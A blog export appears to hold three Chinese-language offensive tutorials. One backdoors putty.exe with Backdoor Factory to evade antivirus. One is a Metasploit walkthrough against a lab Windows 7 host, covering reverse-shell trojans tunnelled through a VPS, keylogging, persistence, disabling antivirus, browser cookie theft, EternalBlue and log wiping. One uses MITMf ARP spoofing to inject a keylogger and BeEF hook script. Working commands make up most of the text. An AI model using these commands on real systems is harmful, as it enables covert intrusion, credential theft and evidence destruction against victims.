<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）"><a href="#1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）" class="headerlink" title="1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）"></a>1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）</h4><h4 id="2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的"><a href="#2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的" class="headerlink" title="2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的"></a>2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的</h4><h4 id="3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"><a href="#3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的" class="headerlink" title="3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"></a>3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的</h4><h4 id="4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"><a href="#4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果" class="headerlink" title="4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"></a>4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果</h4><hr>
<h2 id="0x02-BDF安装"><a href="#0x02-BDF安装" class="headerlink" title="0x02. BDF安装"></a>0x02. BDF安装</h2><h3 id="emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"><a href="#emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱" class="headerlink" title="&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"></a>&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱</h3><blockquote>
<p>docker pull secretsquirrel/the-backdoor-factory</p>
<p>docker run -it -v /Users/apple1/Desktop/:/tmp secretsquirrel/the-backdoor-factory bash</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/44CB258820CB477EB4F211B7A63D08CA/3112" alt="image"></p>
<h3 id="【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"><a href="#【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章" class="headerlink" title="【*】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"></a>【*】这里已经启动了docker中的BDF，不太了解docker的可以看看<a href="http://120.78.87.14/?p=719" target="_blank" rel="external">这篇文章</a></h3><hr>
<h2 id="0x03-BDF生成免杀木马"><a href="#0x03-BDF生成免杀木马" class="headerlink" title="0x03. BDF生成免杀木马"></a>0x03. BDF生成免杀木马</h2><h3 id="1-下载将要被注入木马的模版文件"><a href="#1-下载将要被注入木马的模版文件" class="headerlink" title="1. 下载将要被注入木马的模版文件"></a>1. 下载将要被注入木马的模版文件</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EB8C1C8CBEE5416E9FA58026B7C950EF/3124" alt="image"></p>
<h3 id="2-利用BDF生成木马"><a href="#2-利用BDF生成木马" class="headerlink" title="2. 利用BDF生成木马"></a>2. 利用BDF生成木马</h3><blockquote>
<p>./backdoor.py -f /tmp/putty.exe -s iat_reverse_tcp_stager_threaded -J -H 1.1.1.1 -P 4444</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/36A5444E02914ABDBBC8D8CEC35DF77D/3134" alt="image"></p>
<h3 id="3-将生成的木马拖到物理机上"><a href="#3-将生成的木马拖到物理机上" class="headerlink" title="3. 将生成的木马拖到物理机上"></a>3. 将生成的木马拖到物理机上</h3><blockquote>
<p>mv&emsp;/the-backdoor-factory/backdoored/putty.exe&emsp;/tmp/payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/37B7A19072504B0EA5CB1707961D9342/3140" alt="image"></p>
<h3 id="4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"><a href="#4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉" class="headerlink" title="4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"></a>4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EDA07B6C52C045D7A0D690CCC79C6E3A/3147" alt="image"></p>
<hr>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。"><a href="#emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。" class="headerlink" title="&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。"></a>&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Metasploit]]></title>
      <url>/2017/10/08/Metasploit/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Metasploit-Framework简介"><a href="#0x00-Metasploit-Framework简介" class="headerlink" title="0x00. Metasploit Framework简介"></a>0x00. Metasploit Framework简介</h2><h4 id="emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"><a href="#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！" class="headerlink" title="&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"></a>&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！</h4><a id="more"></a>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/WEBRESOURCE3e65a795a3f7fcac430185b407c010bb/2777" alt="image"></p>
<hr>
<h2 id="0x01-实战操作"><a href="#0x01-实战操作" class="headerlink" title="0x01. 实战操作"></a>0x01. 实战操作</h2><h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><h4 id="1-靶机win-7-emsp-IP-192-168-43-150"><a href="#1-靶机win-7-emsp-IP-192-168-43-150" class="headerlink" title="1. 靶机win 7 &emsp; IP=192.168.43.150"></a>1. 靶机win 7 &emsp; IP=192.168.43.150</h4><h4 id="2-kali-linux-emsp-IP-192-168-43-153"><a href="#2-kali-linux-emsp-IP-192-168-43-153" class="headerlink" title="2. kali linux &emsp; IP=192.168.43.153"></a>2. kali linux &emsp; IP=192.168.43.153</h4><h4 id="3-VPS服务器-emsp-IP-xx-xx-xx-xx"><a href="#3-VPS服务器-emsp-IP-xx-xx-xx-xx" class="headerlink" title="3. VPS服务器 &emsp; IP=xx.xx.xx.xx"></a>3. VPS服务器 &emsp; IP=xx.xx.xx.xx</h4><h2 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h2><h3 id="1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"><a href="#1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）" class="headerlink" title="1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"></a>1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）</h3><blockquote>
<p>vi /etc/ssh/sshd_config &amp;&amp; GatewayPorts:yes</p>
<p>ssh -CfNg -R xx.xx.xx.xx:2333:192.168.43.153:2333 root@xx.xx.xx.xx -p 29402</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/B0A29DC18557456A8233E113B2E545A7/2805" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE26F3A8040346ABAB760ECE9324382F/2786" alt="image"></p>
<h3 id="2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"><a href="#2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章" class="headerlink" title="2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"></a>2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个<a href="http://www.freebuf.com/sectool/67674.html" target="_blank" rel="external">系列文章</a></h3><blockquote>
<p>[*]如果想要在docker启动持续监听可以用如下命令</p>
<p>set exitonsession false &amp;&amp; run -j</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/9CD797025E3C4F73B6249F645BFB89A9/2796" alt="image"></p>
<h3 id="3-在win-7-中执行木马"><a href="#3-在win-7-中执行木马" class="headerlink" title="3. 在win 7 中执行木马"></a>3. 在win 7 中执行木马</h3><p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/5A6F7DAC4D274B64A4CFD66B0080B835/2803" alt="image"></p>
<h3 id="4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程"><a href="#4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程" class="headerlink" title="4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程"></a>4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程</h3><blockquote>
<p>migrate 1988 &amp;&amp; getpid</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6F701A71ADC74D9886456ACAD234579A/2807" alt="image"></p>
<h3 id="5-查看当前权限、系统信息，并尝试提权"><a href="#5-查看当前权限、系统信息，并尝试提权" class="headerlink" title="5. 查看当前权限、系统信息，并尝试提权"></a>5. 查看当前权限、系统信息，并尝试提权</h3><blockquote>
<p>getuid &amp;&amp; sysinfo &amp;&amp; getsystem</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/E4A2C214EB80482099D8EC2FAD4EAD5B/2809" alt="image"></p>
<h3 id="6-查看网络、路由信息"><a href="#6-查看网络、路由信息" class="headerlink" title="6. 查看网络、路由信息"></a>6. 查看网络、路由信息</h3><blockquote>
<p>ifconfig &amp;&amp; route</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6952617E2F0C487D9961361455423D8F/2811" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7BD2DDFFF9C34C97BCC4B83CBBCE460F/2813" alt="image"></p>
<h3 id="7-监视靶机的桌面"><a href="#7-监视靶机的桌面" class="headerlink" title="7. 监视靶机的桌面"></a>7. 监视靶机的桌面</h3><blockquote>
<p>run vnc</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1341936A33D348D9BFA015BD4152A84B/2815" alt="image"></p>
<h3 id="8-启动键盘监听"><a href="#8-启动键盘监听" class="headerlink" title="8. 启动键盘监听"></a>8. 启动键盘监听</h3><blockquote>
<p>keyscan_start &amp;&amp; keyscan_dump</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1048F53C0DB74D29B1966D4DAEFB375C/2817" alt="image"></p>
<h3 id="9-设置后门，维持权限"><a href="#9-设置后门，维持权限" class="headerlink" title="9. 设置后门，维持权限"></a>9. 设置后门，维持权限</h3><blockquote>
<p>run persistence -U -i 10 -p 2333&emsp;192.168.43.153</p>
<p>run persistence -X -i 10 -p 2333&emsp;192.168.43.153</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/4F1F527B74624DB293B3BA98A14B655B/2819" alt="image"></p>
<h3 id="10-截屏查看靶机当前桌面"><a href="#10-截屏查看靶机当前桌面" class="headerlink" title="10. 截屏查看靶机当前桌面"></a>10. 截屏查看靶机当前桌面</h3><blockquote>
<p>screenshot</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6AA05CFBB24A4F58B4B4073C76EA86E7/2821" alt="image"></p>
<h3 id="11-查看当前系统空闲时间"><a href="#11-查看当前系统空闲时间" class="headerlink" title="11. 查看当前系统空闲时间"></a>11. 查看当前系统空闲时间</h3><blockquote>
<p>idletime</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/79CB8D02C9DE4A5AA6B59C8064C0406B/2823" alt="image"></p>
<h3 id="12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）"><a href="#12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）" class="headerlink" title="12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）"></a>12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）</h3><blockquote>
<p>uictl disable keyboard</p>
<p>uictl disable mouse</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1153DFFD1E3E45148071B6547CF0CB28/2825" alt="image"></p>
<h3 id="13-查找靶机中重要的敏感文件"><a href="#13-查找靶机中重要的敏感文件" class="headerlink" title="13. 查找靶机中重要的敏感文件"></a>13. 查找靶机中重要的敏感文件</h3><blockquote>
<p>search -d c:\\ -f payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7FA2C1C2A0F9495D853E8DBE84F3F921/2829" alt="image"></p>
<h3 id="14-指定下载靶机中的文件到本地"><a href="#14-指定下载靶机中的文件到本地" class="headerlink" title="14. 指定下载靶机中的文件到本地"></a>14. 指定下载靶机中的文件到本地</h3><blockquote>
<p>dowmload&emsp;c:\\Users\\root\\Desktop\\payload.exe&emsp;/root/Desktop</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/D64579685D6946E0A1778127C2DC0C89/2831" alt="image"></p>
<h3 id="15-上传指定本地文件到靶机中"><a href="#15-上传指定本地文件到靶机中" class="headerlink" title="15. 上传指定本地文件到靶机中"></a>15. 上传指定本地文件到靶机中</h3><blockquote>
<p>upload&emsp;/root/Desktop/hack.jpeg&emsp;c:\\Users\\root\\Desktop\\payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/590D4B293166484BB1B80C740B766889/2833" alt="image"></p>
<h3 id="16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应"><a href="#16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应" class="headerlink" title="16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应"></a>16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应</h3><blockquote>
<p>webcam_snap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/30AFC5056C0C488CAC1B401A54657300/2835" alt="image"></p>
<hr>
<h1 id="0x02-后渗透测试"><a href="#0x02-后渗透测试" class="headerlink" title="0x02. 后渗透测试"></a>0x02. 后渗透测试</h1><h3 id="1-调用post模块查看当前系统可用的提权模块"><a href="#1-调用post模块查看当前系统可用的提权模块" class="headerlink" title="1. 调用post模块查看当前系统可用的提权模块"></a>1. 调用post模块查看当前系统可用的提权模块</h3><blockquote>
<p>run post/multi/recon/local_exploit_suggester</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/062DCEF953D0483885263D3B68EA6500/2837" alt="image"></p>
<h3 id="2-调用payload模块对靶机进行远程桌面操作"><a href="#2-调用payload模块对靶机进行远程桌面操作" class="headerlink" title="2. 调用payload模块对靶机进行远程桌面操作"></a>2. 调用payload模块对靶机进行远程桌面操作</h3><blockquote>
<p>set payload windows/vncinject/reverse_tcp</p>
<p>set viewonly no </p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/24C3AE7DA38B47D38AD244E1A85412BD/2839" alt="image"></p>
<h3 id="3-关掉靶机中的杀软"><a href="#3-关掉靶机中的杀软" class="headerlink" title="3. 关掉靶机中的杀软"></a>3. 关掉靶机中的杀软</h3><blockquote>
<p>killav</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/98E2F5E758294B1D99BE113B0CDAD0F3/2841" alt="image"></p>
<h3 id="4-收集靶机浏览器的敏感信息-访问记录、cookie"><a href="#4-收集靶机浏览器的敏感信息-访问记录、cookie" class="headerlink" title="4. 收集靶机浏览器的敏感信息(访问记录、cookie)"></a>4. 收集靶机浏览器的敏感信息(访问记录、cookie)</h3><blockquote>
<p>run post/windows/gather/enum_ie</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C1568F9B9B8746F990D13D51A9BE3367/2843" alt="image"></p>
<h3 id="5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions"><a href="#5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions" class="headerlink" title="5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)"></a>5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)</h3><blockquote>
<p>route add 92.168.43.150 255.255.255.0 3</p>
<p>use auxiliary/scanner/portscan/tcp</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE904338A187447E9E4C6EB5627C3F3E/2847" alt="image"></p>
<h3 id="6-扫描一波内网有没有ms17-010漏洞的主机"><a href="#6-扫描一波内网有没有ms17-010漏洞的主机" class="headerlink" title="6. 扫描一波内网有没有ms17_010漏洞的主机"></a>6. 扫描一波内网有没有ms17_010漏洞的主机</h3><blockquote>
<p>use auxiliary/scanner/smb/smb_ms17_010</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/935810641BBC43FF8EB483C0AD4A2343/2849" alt="image"></p>
<h3 id="7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波"><a href="#7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波" class="headerlink" title="7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波"></a>7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波</h3><blockquote>
<p>use exploit/windows/smb/ms17_010_eternalblue</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C4989785A16647D4883A6E243CA78443/2851" alt="image"></p>
<h3 id="8-在靶机的指定应用中注入恶意代码"><a href="#8-在靶机的指定应用中注入恶意代码" class="headerlink" title="8.在靶机的指定应用中注入恶意代码"></a>8.在靶机的指定应用中注入恶意代码</h3><blockquote>
<p>use post/windows/manage/peinjector</p>
</blockquote>
<h3 id="9-功成身退"><a href="#9-功成身退" class="headerlink" title="9. 功成身退"></a>9. 功成身退</h3><blockquote>
<p>clearev</p>
<hr>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"><a href="#emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！" class="headerlink" title="&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"></a>&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！</h4></blockquote>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[MITMF]]></title>
      <url>/2017/10/02/MITMF/</url>
      <content type="html"><![CDATA[<h2 id="0x00-MITMF简介"><a href="#0x00-MITMF简介" class="headerlink" title="0x00. MITMF简介"></a>0x00. MITMF简介</h2><h4 id="emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"><a href="#emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。" class="headerlink" title="&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"></a>&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。</h4><a id="more"></a>
<hr>
<h2 id="0x01-MITMF安装"><a href="#0x01-MITMF安装" class="headerlink" title="0x01. MITMF安装"></a>0x01. MITMF安装</h2><blockquote>
<p>apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file &amp;&amp; apt-get install mitmf</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/9E27BD005D5540E1934FE452379DFAC2/2572" alt="image"></p>
<hr>
<p>pip uninstall twisted &amp;&amp; wget <a href="http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2" target="_blank" rel="external">http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2</a> &amp;&amp; pip install ./Twisted-15.5.0.tar.bz2</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/FCCFFCEFDA2945498587A8278D460BDF/2583" alt="image"></p>
<hr>
<p>pip install python-magic &amp;&amp; git clone <a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory.git</a> &amp;&amp; cd the-backdoor-factory &amp;&amp; ./install.sh</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/488111F29FED41F785D4100CBCAA9E24/2587" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/FEE9D91E745048719660B931704CBFE1/2589" alt="image"></p>
<hr>
<h2 id="0x02-jskeylogger模块"><a href="#0x02-jskeylogger模块" class="headerlink" title="0x02. jskeylogger模块"></a>0x02. jskeylogger模块</h2><h3 id="1-启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http-127-0-0-1-9999之后却能运行成功，可能是什么BUG）"><a href="#1-启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http-127-0-0-1-9999之后却能运行成功，可能是什么BUG）" class="headerlink" title="1. 启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）"></a>1. 启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了<a href="http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）" target="_blank" rel="external">http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）</a></h3><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-jskeylogger</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/08471581A373436BA52AF5C79DC84E23/2624" alt="image"></p>
<h3 id="2-靶机登陆淘宝，查看效果（这里编码出了点问题）"><a href="#2-靶机登陆淘宝，查看效果（这里编码出了点问题）" class="headerlink" title="2. 靶机登陆淘宝，查看效果（这里编码出了点问题）"></a>2. 靶机登陆淘宝，查看效果（这里编码出了点问题）</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/0E7E0B2DBA154FEC8F737B1A63D9A63B/2622" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/5BF3C0C24C4B4D1B8F0E1CECB8654F6C/2619" alt="image"></p>
<hr>
<h2 id="0x03-js-url模块"><a href="#0x03-js-url模块" class="headerlink" title="0x03. --js-url模块"></a>0x03. <strong>-</strong>-js-url模块</h2><h3 id="1-启动beef，构造hook-注：beef的账号密码都是beef"><a href="#1-启动beef，构造hook-注：beef的账号密码都是beef" class="headerlink" title="1. 启动beef，构造hook(注：beef的账号密码都是beef)"></a>1. 启动beef，构造hook(注：beef的账号密码都是beef)</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/EB22D3CBBA2B46F5989DE151AE4A330E/2636" alt="image"></p>
<h3 id="2-启动-js-url模块向目标网页插入hook代码"><a href="#2-启动-js-url模块向目标网页插入hook代码" class="headerlink" title="2. 启动--js-url模块向目标网页插入hook代码"></a>2. 启动<strong>-</strong>-js-url模块向目标网页插入hook代码</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-inject <strong>-</strong>-js-url <a href="http://192.168.1.105:3000/hook.js" target="_blank" rel="external">http://192.168.1.105:3000/hook.js</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/28035242C8EC463ABB136633BD18CCA1/2643" alt="image"></p>
